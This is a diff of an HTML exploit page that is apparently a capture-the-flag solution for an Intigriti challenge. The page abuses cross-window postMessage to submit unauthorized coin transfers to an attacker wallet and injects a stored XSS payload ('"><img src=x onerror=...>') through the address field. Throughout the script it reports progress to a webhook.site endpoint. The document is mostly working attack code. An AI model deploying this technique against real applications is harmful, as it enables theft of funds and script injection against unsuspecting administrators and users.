@@ -11,12 +11,14 @@
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/f1a2a5d7-0a5a-43f6-b11b-4e9cdab5aa3b';
+        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
 
+        // Admin has 100M 1337COIN - sending to our wallet
+        const CURRENCY = '1337COIN';
+
         // XSS Payload - breaks out of title attribute in marketwatch
-        // marketwatch.html has: <span title="${tx?.address}">
-        // The address field is unsanitized in the title attribute!
+        // marketwatch.html: <span title="${tx?.address}">
         const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
 
         function log(msg) {
@@ -29,148 +31,84 @@
             fetch(url, { mode: 'no-cors' }).catch(() => {});
         }
 
-        track('start', 'exploit_loaded', {});
+        track('start', 'exploit_loaded', { currency: CURRENCY });
 
-        // STRATEGY 1: Use window.opener (if bot opened us in a popup)
+        function sendTransactions(targetWindow) {
+            log('Sending BOTH transactions...');
+            track('sending_both', 'sending', { currency: CURRENCY });
+
+            // Send both instantly - async handler processes in parallel
+            targetWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: YOUR_WALLET,
+                    currency: CURRENCY,
+                    amount: 1337
+                }
+            }, '*');
+
+            track('tx1_sent', 'success', { to: YOUR_WALLET, currency: CURRENCY, amount: 1337 });
+            log('TX #1: ' + CURRENCY + ' to ' + YOUR_WALLET);
+
+            targetWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: XSS_WALLET,
+                    currency: CURRENCY,
+                    amount: 1337
+                }
+            }, '*');
+
+            track('tx2_sent', 'success', { to: XSS_WALLET, currency: CURRENCY, amount: 1337 });
+            log('TX #2: ' + CURRENCY + ' with XSS payload');
+        }
+
+        // STRATEGY 1: window.opener (bot opened us in popup)
         if (window.opener && !window.opener.closed) {
-            log('Found window.opener - starting exploit...');
+            log('Found window.opener');
             track('found_opener', 'success', {});
 
-            // Redirect opener to checkout.html first
-            window.opener.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+            window.opener.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
 
-            // Wait for page to load, then send postMessage
+            // Increased timeout - wait for checkout to fully load
             setTimeout(() => {
-                // Transaction 1: Send coins to your wallet
-                log('Sending TX #1 to ' + YOUR_WALLET + '...');
-                track('tx1_start', 'sending', { to: YOUR_WALLET });
-
-                window.opener.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx1_sent', 'success', {});
-                log('TX #1 sent!');
-
-                // Transaction 2: Send to XSS wallet (breaks out of title attribute)
-                setTimeout(() => {
-                    log('Sending TX #2 with XSS payload...');
-                    track('tx2_start', 'sending', { to: XSS_WALLET });
-
-                    window.opener.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: XSS_WALLET,
-                            currency: '1337COIN',
-                            amount: 1337
-                        }
-                    }, '*');
-
-                    track('tx2_sent', 'success', {});
-                    log('TX #2 sent with XSS!');
-                    log('XSS will trigger when admin views marketwatch!');
-                }, 2000);
-            }, 5000);
+                log('Checkout should be loaded, sending...');
+                sendTransactions(window.opener);
+            }, 8000);
         }
-        // STRATEGY 2: Use window.parent (if bot opened us in an iframe)
+        // STRATEGY 2: window.parent (bot opened us in iframe)
         else if (window.parent && window.parent !== window) {
-            log('Found window.parent - starting exploit...');
+            log('Found window.parent');
             track('found_parent', 'success', {});
 
-            window.parent.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+            window.parent.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
 
             setTimeout(() => {
-                log('Sending TX #1 to ' + YOUR_WALLET + '...');
-                track('tx1_start', 'sending', { to: YOUR_WALLET });
-
-                window.parent.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: YOUR_WALLET,
-                        currency: '1337COIN',
-                        amount: 1337
-                    }
-                }, '*');
-
-                track('tx1_sent', 'success', {});
-                log('TX #1 sent!');
-
-                setTimeout(() => {
-                    log('Sending TX #2 with XSS payload...');
-                    track('tx2_start', 'sending', { to: XSS_WALLET });
-
-                    window.parent.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: XSS_WALLET,
-                            currency: '1337COIN',
-                            amount: 1337
-                        }
-                    }, '*');
-
-                    track('tx2_sent', 'success', {});
-                    log('TX #2 sent with XSS!');
-                    log('XSS will trigger when admin views marketwatch!');
-                }, 2000);
-            }, 5000);
+                log('Checkout should be loaded, sending...');
+                sendTransactions(window.parent);
+            }, 8000);
         }
-        // STRATEGY 3: Try to open popup (fallback - will likely be blocked)
+        // STRATEGY 3: Try popup
         else {
-            log('No opener or parent found, trying popup...');
+            log('Trying popup...');
             track('trying_popup', 'attempting', {});
 
-            const popup = window.open(`${BASE}/checkout.html?currency=1337COIN&price=1`, 'checkout', 'width=1000,height=800');
+            const popup = window.open(`${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`, 'checkout', 'width=1000,height=800');
 
             if (popup) {
-                log('Popup opened! Sending transactions...');
+                log('Popup opened');
                 track('popup_opened', 'success', {});
 
                 setTimeout(() => {
-                    log('Sending TX #1 to ' + YOUR_WALLET + '...');
-                    track('tx1_start', 'sending', { to: YOUR_WALLET });
-
-                    popup.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: YOUR_WALLET,
-                            currency: '1337COIN',
-                            amount: 1337
-                        }
-                    }, '*');
-
-                    track('tx1_sent', 'success', {});
-                    log('TX #1 sent!');
-
-                    setTimeout(() => {
-                        log('Sending TX #2 with XSS payload...');
-                        track('tx2_start', 'sending', { to: XSS_WALLET });
-
-                        popup.postMessage({
-                            type: 'submitTransaction',
-                            transaction: {
-                                toAddress: XSS_WALLET,
-                                currency: '1337COIN',
-                                amount: 1337
-                            }
-                        }, '*');
-
-                        track('tx2_sent', 'success', {});
-                        log('TX #2 sent with XSS!');
-                        log('XSS will trigger when admin views marketwatch!');
-                    }, 2000);
-                }, 5000);
+                    sendTransactions(popup);
+                }, 8000);
             } else {
-                log('Popup blocked - exploit failed!');
+                log('Popup blocked');
                 track('popup_blocked', 'failed', {});
             }
         }
 
-        track('complete', 'exploit_attempted', {});
+        track('complete', 'waiting_for_checkout', {});
     </script>
 </body>
 </html>
